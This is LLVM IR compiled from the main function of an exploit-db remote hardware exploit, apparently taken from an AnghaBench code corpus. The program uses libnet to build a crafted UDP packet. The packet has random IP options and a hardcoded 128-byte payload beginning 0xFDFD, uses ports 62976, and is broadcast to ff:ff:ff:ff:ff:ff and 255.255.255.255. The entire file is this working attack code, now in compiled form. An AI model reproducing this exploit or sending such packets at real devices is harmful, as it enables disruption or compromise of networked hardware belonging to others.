; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_425.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_425.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@LIBNET_ERRBUF_SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [18 x i8] c"ff:ff:ff:ff:ff:ff\00", align 1
@__const.main.payload = private unnamed_addr constant [128 x i8] c"\FD\FD\00\04\00\03\00\0F=V\97\07\0A\0022\00\00\FF\FF\FF\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 16
@.str.1 = private unnamed_addr constant [16 x i8] c"255.255.255.255\00", align 1
@LIBNET_DONT_RESOLVE = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [22 x i8] c"cant get mac str - %s\00", align 1
@LIBNET_LINK = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [18 x i8] c"cant init() - %s\0A\00", align 1
@LIBNET_UDP_H = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [21 x i8] c"cant build udp - %s\0A\00", align 1
@LIBNET_PR2 = common dso_local global i32 0, align 4
@LIBNET_IPV4_H = common dso_local global i32 0, align 4
@IPPROTO_UDP = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [22 x i8] c"cant build ipv4 - %s\0A\00", align 1
@ETHERTYPE_IP = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [22 x i8] c"cant build ether - %s\00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i64, align 8
  %19 = alloca [21 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32*, align 8
  %23 = alloca [128 x i8], align 16
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 62976, i32* %13, align 4
  store i32 62976, i32* %14, align 4
  %25 = load i32, i32* @LIBNET_ERRBUF_SIZE, align 4
  %26 = zext i32 %25 to i64
  %27 = call i8* @llvm.stacksave()
  store i8* %27, i8** %17, align 8
  %28 = alloca i8, i64 %26, align 16
  store i64 %26, i64* %18, align 8
  store i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i64 0, i64 0), i8** %21, align 8
  %29 = bitcast [128 x i8]* %23 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %29, i8* align 16 getelementptr inbounds ([128 x i8], [128 x i8]* @__const.main.payload, i32 0, i32 0), i64 128, i1 false)
  %30 = getelementptr inbounds [128 x i8], [128 x i8]* %23, i64 0, i64 0
  %31 = call i32 @strlen(i8* %30)
  store i32 %31, i32* %24, align 4
  %32 = load i32*, i32** %6, align 8
  %33 = call i32 @libnet_get_ipaddr4(i32* %32)
  store i32 %33, i32* %11, align 4
  %34 = load i32*, i32** %6, align 8
  %35 = load i32, i32* @LIBNET_DONT_RESOLVE, align 4
  %36 = call i32 @libnet_name2addr4(i32* %34, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0), i32 %35)
  store i32 %36, i32* %12, align 4
  store i32 0, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %37 = load i8*, i8** %21, align 8
  %38 = call i32* @libnet_hex_aton(i8* %37, i32* %20)
  store i32* %38, i32** %22, align 8
  %39 = icmp eq i32* %38, null
  br i1 %39, label %40, label %46

40:                                               ; preds = %2
  %41 = load i32, i32* @stderr, align 4
  %42 = load i32*, i32** %6, align 8
  %43 = call i8* @libnet_geterror(i32* %42)
  %44 = call i32 @fprintf(i32 %41, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.2, i64 0, i64 0), i8* %43)
  %45 = call i32 @exit(i32 1) #5
  unreachable

46:                                               ; preds = %2
  %47 = load i32, i32* @LIBNET_LINK, align 4
  %48 = call i32* @libnet_init(i32 %47, i32* null, i8* %28)
  store i32* %48, i32** %6, align 8
  %49 = icmp eq i32* %48, null
  br i1 %49, label %50, label %54

50:                                               ; preds = %46
  %51 = load i32, i32* @stderr, align 4
  %52 = call i32 @fprintf(i32 %51, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.3, i64 0, i64 0), i8* %28)
  %53 = call i32 @exit(i32 1) #5
  unreachable

54:                                               ; preds = %46
  %55 = load i32, i32* %13, align 4
  %56 = load i32, i32* %14, align 4
  %57 = load i32, i32* @LIBNET_UDP_H, align 4
  %58 = load i32, i32* %24, align 4
  %59 = add nsw i32 %57, %58
  %60 = getelementptr inbounds [128 x i8], [128 x i8]* %23, i64 0, i64 0
  %61 = load i32, i32* %24, align 4
  %62 = load i32*, i32** %6, align 8
  %63 = load i32, i32* %8, align 4
  %64 = call i32 @libnet_build_udp(i32 %55, i32 %56, i32 %59, i32 0, i8* %60, i32 %61, i32* %62, i32 %63)
  store i32 %64, i32* %8, align 4
  %65 = icmp eq i32 %64, -1
  br i1 %65, label %66, label %72

66:                                               ; preds = %54
  %67 = load i32, i32* @stderr, align 4
  %68 = load i32*, i32** %6, align 8
  %69 = call i8* @libnet_geterror(i32* %68)
  %70 = call i32 @fprintf(i32 %67, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0), i8* %69)
  %71 = call i32 @exit(i32 1) #5
  unreachable

72:                                               ; preds = %54
  store i32 0, i32* %15, align 4
  br label %73

73:                                               ; preds = %82, %72
  %74 = load i32, i32* %15, align 4
  %75 = icmp slt i32 %74, 20
  br i1 %75, label %76, label %85

76:                                               ; preds = %73
  %77 = load i32, i32* @LIBNET_PR2, align 4
  %78 = call signext i8 @libnet_get_prand(i32 %77)
  %79 = load i32, i32* %15, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds [21 x i8], [21 x i8]* %19, i64 0, i64 %80
  store i8 %78, i8* %81, align 1
  br label %82

82:                                               ; preds = %76
  %83 = load i32, i32* %15, align 4
  %84 = add nsw i32 %83, 1
  store i32 %84, i32* %15, align 4
  br label %73

85:                                               ; preds = %73
  %86 = getelementptr inbounds [21 x i8], [21 x i8]* %19, i64 0, i64 0
  %87 = load i32*, i32** %6, align 8
  %88 = load i32, i32* %9, align 4
  %89 = call i32 @libnet_build_ipv4_options(i8* %86, i32 20, i32* %87, i32 %88)
  store i32 %89, i32* %9, align 4
  %90 = load i32, i32* @LIBNET_IPV4_H, align 4
  %91 = add nsw i32 %90, 20
  %92 = load i32, i32* %24, align 4
  %93 = add nsw i32 %91, %92
  %94 = load i32, i32* @LIBNET_UDP_H, align 4
  %95 = add nsw i32 %93, %94
  %96 = load i32, i32* @IPPROTO_UDP, align 4
  %97 = load i32, i32* %11, align 4
  %98 = load i32, i32* %12, align 4
  %99 = getelementptr inbounds [128 x i8], [128 x i8]* %23, i64 0, i64 0
  %100 = load i32, i32* %24, align 4
  %101 = load i32*, i32** %6, align 8
  %102 = load i32, i32* %7, align 4
  %103 = call i32 @libnet_build_ipv4(i32 %95, i32 0, i32 250, i32 0, i32 128, i32 %96, i32 0, i32 %97, i32 %98, i8* %99, i32 %100, i32* %101, i32 %102)
  store i32 %103, i32* %7, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %111

105:                                              ; preds = %85
  %106 = load i32, i32* @stderr, align 4
  %107 = load i32*, i32** %6, align 8
  %108 = call i8* @libnet_geterror(i32* %107)
  %109 = call i32 @fprintf(i32 %106, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.5, i64 0, i64 0), i8* %108)
  %110 = call i32 @exit(i32 1) #5
  unreachable

111:                                              ; preds = %85
  %112 = load i32*, i32** %22, align 8
  %113 = load i32*, i32** %22, align 8
  %114 = load i32, i32* @ETHERTYPE_IP, align 4
  %115 = load i32*, i32** %6, align 8
  %116 = load i32, i32* %10, align 4
  %117 = call i32 @libnet_build_ethernet(i32* %112, i32* %113, i32 %114, i32* null, i32 0, i32* %115, i32 %116)
  store i32 %117, i32* %10, align 4
  %118 = icmp eq i32 %117, -1
  br i1 %118, label %119, label %125

119:                                              ; preds = %111
  %120 = load i32, i32* @stderr, align 4
  %121 = load i32*, i32** %6, align 8
  %122 = call i8* @libnet_geterror(i32* %121)
  %123 = call i32 @fprintf(i32 %120, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.6, i64 0, i64 0), i8* %122)
  %124 = call i32 @exit(i32 1) #5
  unreachable

125:                                              ; preds = %111
  %126 = load i32*, i32** %6, align 8
  %127 = call i32 @libnet_write(i32* %126)
  store i32 %127, i32* %16, align 4
  %128 = icmp eq i32 %127, -1
  br i1 %128, label %129, label %134

129:                                              ; preds = %125
  %130 = load i32, i32* @stderr, align 4
  %131 = load i32*, i32** %6, align 8
  %132 = call i8* @libnet_geterror(i32* %131)
  %133 = call i32 @fprintf(i32 %130, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0), i8* %132)
  br label %134

134:                                              ; preds = %129, %125
  %135 = load i32*, i32** %22, align 8
  %136 = call i32 @free(i32* %135)
  %137 = load i32*, i32** %6, align 8
  %138 = call i32 @libnet_destroy(i32* %137)
  store i32 0, i32* %3, align 4
  %139 = load i8*, i8** %17, align 8
  call void @llvm.stackrestore(i8* %139)
  %140 = load i32, i32* %3, align 4
  ret i32 %140
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @strlen(i8*) #3

declare dso_local i32 @libnet_get_ipaddr4(i32*) #3

declare dso_local i32 @libnet_name2addr4(i32*, i8*, i32) #3

declare dso_local i32* @libnet_hex_aton(i8*, i32*) #3

declare dso_local i32 @fprintf(i32, i8*, i8*) #3

declare dso_local i8* @libnet_geterror(i32*) #3

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #4

declare dso_local i32* @libnet_init(i32, i32*, i8*) #3

declare dso_local i32 @libnet_build_udp(i32, i32, i32, i32, i8*, i32, i32*, i32) #3

declare dso_local signext i8 @libnet_get_prand(i32) #3

declare dso_local i32 @libnet_build_ipv4_options(i8*, i32, i32*, i32) #3

declare dso_local i32 @libnet_build_ipv4(i32, i32, i32, i32, i32, i32, i32, i32, i32, i8*, i32, i32*, i32) #3

declare dso_local i32 @libnet_build_ethernet(i32*, i32*, i32, i32*, i32, i32*, i32) #3

declare dso_local i32 @libnet_write(i32*) #3

declare dso_local i32 @free(i32*) #3

declare dso_local i32 @libnet_destroy(i32*) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
